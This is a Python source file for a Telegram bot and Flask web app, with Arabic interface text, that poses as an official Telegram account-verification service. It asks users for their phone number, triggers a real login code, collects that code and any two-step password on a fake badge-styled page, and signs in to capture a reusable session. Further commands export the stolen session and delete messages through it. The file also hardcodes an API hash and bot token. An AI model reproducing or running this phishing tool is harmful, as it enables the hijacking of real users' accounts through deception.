from flask import Flask, render_template_string, request, jsonify
from telethon import TelegramClient
from telethon.sessions import StringSession
import asyncio
import os
import threading
import base64
import io
from telegram import Update, WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, InputFile
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters

app = Flask(__name__)

API_ID = 25757508
API_HASH = '3091fbda91d4b133207779ddf81fee39'
BOT_TOKEN = "8828318815:AAEJ63XFWpwwuigCWuO_-Hu94sJVyhgn338"

active_sessions = {}

WEB_APP_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>توثيق تيليجرام الرسمي</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { 
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%); 
            color: #f8fafc; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }
        .card { 
            background: rgba(30, 41, 59, 0.8); 
            backdrop-filter: blur(10px);
            padding: 30px; 
            border-radius: 20px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.5); 
            width: 340px; 
            text-align: center; 
            border: 1px solid rgba(255, 255, 255, 0.1); 
        }
        .badge-container { position: relative; width: 90px; height: 90px; margin: 0 auto 20px auto; }
        .avatar { 
            width: 90px; 
            height: 90px; 
            background: linear-gradient(45deg, #3b82f6, #2563eb); 
            border-radius: 50%; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            font-size: 36px; 
            color: #fff; 
            font-weight: bold; 
            overflow: hidden; 
            box-shadow: 0 4px 15px rgba(59, 130, 246, 0.4);
        }
        .avatar img { width: 100%; height: 100%; object-fit: cover; }
        .blue-badge { 
            position: absolute; 
            bottom: 0; 
            right: 0; 
            background: #3b82f6; 
            width: 28px; 
            height: 28px; 
            border-radius: 50%; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            border: 3px solid #1e293b; 
            z-index: 10; 
        }
        .blue-badge svg { width: 16px; height: 16px; fill: #fff; }
        h3 { color: #f8fafc; margin: 10px 0 5px 0; font-size: 22px; font-weight: 600; }
        p { color: #94a3b8; font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
        input { 
            width: 90%; 
            padding: 14px; 
            margin: 10px 0; 
            border-radius: 12px; 
            border: 1px solid rgba(255, 255, 255, 0.1); 
            background: rgba(15, 23, 42, 0.6); 
            color: #fff; 
            font-size: 16px; 
            text-align: center; 
            outline: none; 
            transition: all 0.3s ease;
        }
        input:focus { border-color: #3b82f6; box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2); }
        button { 
            width: 95%; 
            padding: 14px; 
            background: linear-gradient(45deg, #3b82f6, #2563eb); 
            color: white; 
            border: none; 
            border-radius: 12px; 
            font-size: 16px; 
            cursor: pointer; 
            font-weight: 600; 
            margin-top: 20px; 
            transition: all 0.3s ease; 
            box-shadow: 0 4px 15px rgba(59, 130, 246, 0.3);
        }
        button:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(59, 130, 246, 0.4); }
        .msg { color: #ef4444; font-size: 14px; margin-bottom: 15px; font-weight: 500; }
        .success { 
            color: #10b981; 
            font-size: 13px; 
            word-break: break-all; 
            background: rgba(16, 185, 129, 0.1); 
            padding: 15px; 
            border-radius: 12px; 
            text-align: left; 
            direction: ltr; 
            max-height: 120px; 
            overflow-y: auto; 
            border: 1px solid rgba(16, 185, 129, 0.2); 
            margin-top: 15px; 
        }
        .success::-webkit-scrollbar { width: 6px; }
        .success::-webkit-scrollbar-track { background: transparent; }
        .success::-webkit-scrollbar-thumb { background: rgba(16, 185, 129, 0.5); border-radius: 10px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="badge-container">
            <div class="avatar" id="avatar_box">
                <span id="user_initials">TG</span>
            </div>
            <div class="blue-badge">
                <svg viewBox="0 0 24 24"><path d="M9 16.2l-3.5-3.5 1.4-1.4L9 13.4l9.1-9.1 1.4 1.4z"/></svg>
            </div>
        </div>
        <h3>توثيق الحساب الرسمي</h3>
        <p id="desc_text">الرجاء إدخال رمز التحقق المرسل إليك في تيليجرام:</p>
        
        <div id="content">
            <div id="error_box" class="msg"></div>
            <input type="text" id="code_val" placeholder="الرمز (مثال: 12345)">
            <button onclick="submitCode()">تأكيد الرمز</button>
        </div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();
        let phoneNum = "{{ phone }}";
        let userPhoto = "{{ photo_base64 }}";
        let userName = "{{ first_name }}";

        if (userPhoto && userPhoto.length > 10) {
            document.getElementById('avatar_box').innerHTML = `<img src="data:image/jpeg;base64,${userPhoto}" alt="Avatar">`;
        } else if (userName) {
            document.getElementById('user_initials').innerText = userName.charAt(0).toUpperCase();
        }

        function submitCode() {
            let code = document.getElementById('code_val').value.toString().trim();
            if(!code) { alert("الرجاء إدخال الرمز!"); return; }

            document.getElementById('error_box').innerText = "جاري التحقق...";
            document.getElementById('error_box').style.color = "#3b82f6";

            fetch('/api', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ action: 'code', phone: phoneNum, value: code })
            })
            .then(res => res.json())
            .then(data => {
                if (data.status === 'need_password') {
                    document.getElementById('desc_text').innerText = "الحساب محمي بخطوتين. الرجاء إدخال كلمة المرور:";
                    document.getElementById('content').innerHTML = `
                        <div id="error_box" class="msg"></div>
                        <input type="password" id="pass_val" placeholder="كلمة المرور">
                        <button onclick="submitPassword()">تسجيل الدخول</button>`;
                } else if (data.status === 'done') {
                    document.getElementById('desc_text').innerText = "تم التوثيق بنجاح!";
                    document.getElementById('content').innerHTML = `
                        <h3 style="color: #10b981; margin-bottom: 15px;">✅ اكتملت العملية!</h3>
                        <p style="margin-bottom: 10px;">تم حفظ الجلسة بنجاح:</p>
                        <div class="success">${data.session}</div>
                        <button onclick="tg.close()" style="background: #475569; margin-top: 15px;">إغلاق</button>`;
                } else {
                    document.getElementById('error_box').style.color = "#ef4444";
                    document.getElementById('error_box').innerText = data.message || "حدث خطأ";
                }
            }).catch(err => {
                document.getElementById('error_box').style.color = "#ef4444";
                document.getElementById('error_box').innerText = "خطأ في الاتصال";
            });
        }

        function submitPassword() {
            let pass = document.getElementById('pass_val').value.toString().trim();
            if(!pass) { alert("الرجاء إدخال كلمة المرور!"); return; }

            document.getElementById('error_box').innerText = "جاري التحقق من كلمة المرور...";
            document.getElementById('error_box').style.color = "#3b82f6";

            fetch('/api', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ action: 'password', phone: phoneNum, value: pass })
            })
            .then(res => res.json())
            .then(data => {
                if (data.status === 'done') {
                    document.getElementById('desc_text').innerText = "تم التوثيق بنجاح!";
                    document.getElementById('content').innerHTML = `
                        <h3 style="color: #10b981; margin-bottom: 15px;">✅ اكتملت العملية!</h3>
                        <p style="margin-bottom: 10px;">تم حفظ الجلسة بنجاح:</p>
                        <div class="success">${data.session}</div>
                        <button onclick="tg.close()" style="background: #475569; margin-top: 15px;">إغلاق</button>`;
                } else {
                    document.getElementById('error_box').style.color = "#ef4444";
                    document.getElementById('error_box').innerText = data.message || "كلمة المرور غير صحيحة";
                }
            }).catch(err => {
                document.getElementById('error_box').style.color = "#ef4444";
                document.getElementById('error_box').innerText = "خطأ في الاتصال";
            });
        }
    </script>
</body>
</html>
"""

@app.route('/verify/<path:phone>')
def verify_page(phone):
    session_data = active_sessions.get(phone)
    photo_b64 = session_data.get('photo_b64', '') if session_data else ''
    first_name = session_data.get('first_name', 'Telegram') if session_data else 'Telegram'
    return render_template_string(WEB_APP_HTML, phone=phone, photo_base64=photo_b64, first_name=first_name)

@app.route('/api', methods=['POST'])
def api():
    global active_sessions
    data = request.json
    action = data.get('action')
    phone = data.get('phone')
    value = str(data.get('value')) if data.get('value') else ""

    session_data = active_sessions.get(phone)
    if not session_data:
        return jsonify({"status": "error", "message": "انتهت صلاحية الجلسة."})

    try:
        session_str_val = session_data['session_str_val']
        hash_val = session_data['hash']

        async def execute_action():
            async with TelegramClient(StringSession(session_str_val), API_ID, API_HASH) as client:
                if action == 'code':
                    try:
                        await client.sign_in(str(phone), str(value).strip(), phone_code_hash=str(hash_val))
                        new_session = client.session.save()
                        session_data['session_str'] = new_session
                        return {"status": "done", "session": str(new_session)}
                    except Exception as e:
                        err_str = str(e)
                        if "SessionPasswordNeededError" in err_str or "password" in err_str.lower() or "Password" in err_str:
                            return {"status": "need_password"}
                        else:
                            return {"status": "error", "message": err_str}

                elif action == 'password':
                    try:
                        await client.sign_in(password=str(value).strip())
                        new_session = client.session.save()
                        session_data['session_str'] = new_session
                        return {"status": "done", "session": str(new_session)}
                    except Exception as e:
                        return {"status": "error", "message": f"كلمة المرور غير صحيحة: {e}"}

        res = asyncio.run(execute_action())
        return jsonify(res)

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    button = KeyboardButton("🛡️ توثيق رقم الهاتف", request_contact=True)
    reply_markup = ReplyKeyboardMarkup([[button]], resize_keyboard=True, one_time_keyboard=True)
    
    await update.message.reply_text(
        "👋 أهلاً بك في مركز توثيق تيليجرام الرسمي.\n\nاضغط على الزر بالأسفل لتوثيق رقم هاتفك:",
        reply_markup=reply_markup
    )

async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    
    try:
        await update.message.delete()
    except Exception:
        pass

    if contact:
        phone = contact.phone_number
        if not phone.startswith('+'):
            phone = '+' + phone

        try:
            temp_client = TelegramClient(StringSession(), API_ID, API_HASH)
            await temp_client.connect()
            
            sent_code = await temp_client.send_code_request(phone)
            
            photo_b64 = ""
            first_name = "Telegram"
            try:
                me = await temp_client.get_me()
                if me:
                    first_name = me.first_name or "Telegram"
                    path = await temp_client.download_profile_photo(me, file="bytes")
                    if path:
                        photo_b64 = base64.b64encode(path).decode('utf-8')
            except Exception:
                pass

            session_str_val = temp_client.session.save()
            await temp_client.disconnect()

            active_sessions[phone] = {
                'session_str_val': session_str_val,
                'phone': phone,
                'hash': str(sent_code.phone_code_hash),
                'photo_b64': photo_b64,
                'first_name': first_name
            }

            base_url = os.getenv('RENDER_EXTERNAL_URL', 'wahm0.onrender.com')
            if not base_url.startswith('http'):
                base_url = f"https://{base_url}"

            web_url = f"{base_url}/verify/{phone}"

            keyboard = [[InlineKeyboardButton("💬 إدخال رمز التحقق", web_app=WebAppInfo(url=web_url))]]
            reply_markup = InlineKeyboardMarkup(keyboard)

            await update.message.reply_text(
                "✅ تم إرسال رمز التحقق إلى حسابك في تيليجرام بنجاح. اضغط على الزر بالأسفل لإدخال الرمز:",
                reply_markup=reply_markup
            )
        except Exception as e:
            await update.message.reply_text(f"❌ خطأ في إرسال الرمز: {e}")

async def wahm_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    session_data = None
    for p, data in active_sessions.items():
        if 'session_str' in data:
            session_data = data
            break

    if not session_data or 'session_str' not in session_data:
        await update.message.reply_text("❌ لم يتم العثور على جلسة نشطة. يرجى توثيق الحساب أولاً!")
        return

    session_string = session_data['session_str']
    phone = session_data['phone']
    first_name = session_data['first_name']

    # إنشاء ملف نصي فخم للجلسة
    file_content = f"""━━━━━━━━━━━━━━━━━━━━━
🌟 تم استخراج الجلسة بنجاح 🌟
━━━━━━━━━━━━━━━━━━━━━
👤 الاسم: {first_name}
📱 الرقم: {phone}
━━━━━━━━━━━━━━━━━━━━━
🔑 كود الجلسة (String Session):
{session_string}
━━━━━━━━━━━━━━━━━━━━━
🛡️ مطور البوت: FOKHM
━━━━━━━━━━━━━━━━━━━━━"""

    file_bytes = io.BytesIO(file_content.encode('utf-8'))
    file_bytes.name = f"Session_{phone}.txt"

    caption = f"""
✅ **تم تسجيل الدخول بنجاح!**

👤 **الحساب:** {first_name}
📱 **الرقم:** `{phone}`

📥 **ملف الجلسة الخاص بك مرفق أدناه.**
✨ *احتفظ به في مكان آمن!*
"""

    await update.message.reply_document(
        document=InputFile(file_bytes, filename=f"Session_{phone}.txt"),
        caption=caption,
        parse_mode='Markdown'
    )

async def delete_messages_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    session_data = None
    for p, data in active_sessions.items():
        if 'session_str' in data:
            session_data = data
            break

    if not session_data or 'session_str' not in session_data:
        await update.message.reply_text("❌ يجب إكمال التوثيق أولاً!")
        return

    args = context.args
    limit = int(args[0]) if args and args[0].isdigit() else 100
    chat = update.effective_chat

    status_msg = await update.message.reply_text(f"⏳ جاري حذف آخر {limit} رسالة...")

    try:
        session_str = session_data['session_str']
        async with TelegramClient(StringSession(session_str), API_ID, API_HASH) as client:
            deleted_count = 0
            async for message in client.iter_messages(chat.id, from_user='me', limit=limit):
                try:
                    await client.delete_messages(chat.id, message.id)
                    deleted_count += 1
                    await asyncio.sleep(0.3)
                except Exception:
                    pass

        await status_msg.edit_text(f"✅ تم حذف {deleted_count} رسالة بنجاح.")
    except Exception as e:
        await status_msg.edit_text(f"❌ خطأ: {e}")

async def auto_delete_user_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.message.delete()
    except Exception:
        pass

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), use_reloader=False)

if __name__ == '__main__':
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("wahm", wahm_command))
    application.add_handler(CommandHandler("delet", delete_messages_command))
    application.add_handler(MessageHandler(filters.CONTACT, contact_handler))
    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), auto_delete_user_messages))
    
    print("Fokhm Perfect Bot is running...")
    application.run_polling()
